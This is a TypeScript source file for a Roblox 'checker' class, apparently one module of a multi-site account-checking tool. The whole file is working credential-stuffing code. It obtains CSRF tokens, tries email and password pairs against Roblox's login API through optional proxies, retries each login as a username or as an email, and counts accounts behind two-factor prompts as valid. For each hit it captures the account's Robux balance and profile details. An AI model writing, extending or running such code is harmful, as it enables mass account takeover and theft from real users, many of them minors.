import { BaseChecker } from './base';
import { CheckResult } from '@/types';

export class RobloxChecker extends BaseChecker {
  constructor(proxy?: any, timeout?: number) {
    super('roblox', proxy, timeout);
  }

  async check(credential: string, password: string): Promise<CheckResult> {
    return this.checkWithFallback(
      credential,
      password,
      this.checkWithCredential.bind(this),
      this.isEmail(credential) ? this.checkAsUsername.bind(this) : this.checkAsEmail.bind(this)
    );
  }

  private async checkWithCredential(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get CSRF token
      const csrfResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {}
      ).catch(err => err.response);

      const csrfToken = csrfResponse?.headers['x-csrf-token'];

      if (!csrfToken) {
        throw new Error('Failed to get CSRF token');
      }

      // Determine credential type for API
      const credentialType = this.isEmail(credential) ? 'Email' : 'Username';

      // Login attempt
      const loginResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {
          ctype: credentialType,
          cvalue: credential,
          password: password,
        },
        {
          headers: {
            'X-CSRF-TOKEN': csrfToken,
            'Content-Type': 'application/json',
          },
        }
      );

      if (loginResponse.data?.user) {
        const capture = await this.getAccountDetails(loginResponse.data.user.id);
        return this.createResult(credential, password, 'roblox', 'valid', capture);
      }

      return this.createResult(credential, password, 'roblox', 'invalid');
    } catch (error: any) {
      if (error.response?.data?.errors?.[0]?.code === 'TwoStepVerificationRequired') {
        return this.createResult(credential, password, 'roblox', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.handleError(error, credential, password);
    }
  }

  private async checkAsUsername(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get fresh CSRF token
      const csrfResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {}
      ).catch(err => err.response);

      const csrfToken = csrfResponse?.headers['x-csrf-token'];

      if (!csrfToken) {
        return this.createResult(credential, password, 'roblox', 'invalid');
      }

      // Try as username
      const loginResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {
          ctype: 'Username',
          cvalue: credential,
          password: password,
        },
        {
          headers: {
            'X-CSRF-TOKEN': csrfToken,
          },
        }
      );

      if (loginResponse.data?.user) {
        const capture = await this.getAccountDetails(loginResponse.data.user.id);
        return this.createResult(credential, password, 'roblox', 'valid', capture);
      }

      return this.createResult(credential, password, 'roblox', 'invalid');
    } catch (error: any) {
      if (error.response?.data?.errors?.[0]?.code === 'TwoStepVerificationRequired') {
        return this.createResult(credential, password, 'roblox', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(credential, password, 'roblox', 'invalid');
    }
  }

  private async checkAsEmail(credential: string, password: string): Promise<CheckResult> {
    try {
      // Get fresh CSRF token
      const csrfResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {}
      ).catch(err => err.response);

      const csrfToken = csrfResponse?.headers['x-csrf-token'];

      if (!csrfToken) {
        return this.createResult(credential, password, 'roblox', 'invalid');
      }

      // Try as email
      const loginResponse = await this.client.post(
        'https://auth.roblox.com/v2/login',
        {
          ctype: 'Email',
          cvalue: credential,
          password: password,
        },
        {
          headers: {
            'X-CSRF-TOKEN': csrfToken,
          },
        }
      );

      if (loginResponse.data?.user) {
        const capture = await this.getAccountDetails(loginResponse.data.user.id);
        return this.createResult(credential, password, 'roblox', 'valid', capture);
      }

      return this.createResult(credential, password, 'roblox', 'invalid');
    } catch (error: any) {
      if (error.response?.data?.errors?.[0]?.code === 'TwoStepVerificationRequired') {
        return this.createResult(credential, password, 'roblox', 'valid', {
          twoFactorEnabled: true,
        });
      }

      return this.createResult(credential, password, 'roblox', 'invalid');
    }
  }

  private async getAccountDetails(userId: number) {
    try {
      const [userInfo, robux] = await Promise.all([
        this.client.get(`https://users.roblox.com/v1/users/${userId}`),
        this.client.get(`https://economy.roblox.com/v1/users/${userId}/currency`).catch(() => ({ data: {} })),
      ]);

      return {
        username: userInfo.data?.name,
        displayName: userInfo.data?.displayName,
        createdDate: userInfo.data?.created,
        robux: robux.data?.robux || 0,
        isPremium: userInfo.data?.hasVerifiedBadge || false,
        userId: userId,
      };
    } catch {
      return { userId };
    }
  }
}
